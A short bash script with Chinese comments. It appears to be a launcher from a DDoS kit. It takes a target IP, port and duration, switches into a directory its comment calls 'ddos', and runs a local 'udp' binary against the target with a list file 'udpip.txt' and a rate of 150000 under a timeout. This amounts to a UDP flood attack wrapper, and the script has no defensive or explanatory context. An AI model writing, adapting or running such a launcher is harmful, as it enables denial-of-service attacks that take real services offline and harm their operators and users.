#!/bin/bash

# 检查参数数量
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP> <PORT> <NUMBER>"
    exit 1
fi

# 获取参数
IP=$1
PORT=$2
NUMBER=$3

# 切换到 ddos 目录
cd "$(dirname "$0")"

# 执行 meme 命令
timeout "$((NUMBER - 1))" ./udp "$IP" "$PORT" udpip.txt 1 150000 "$NUMBER"
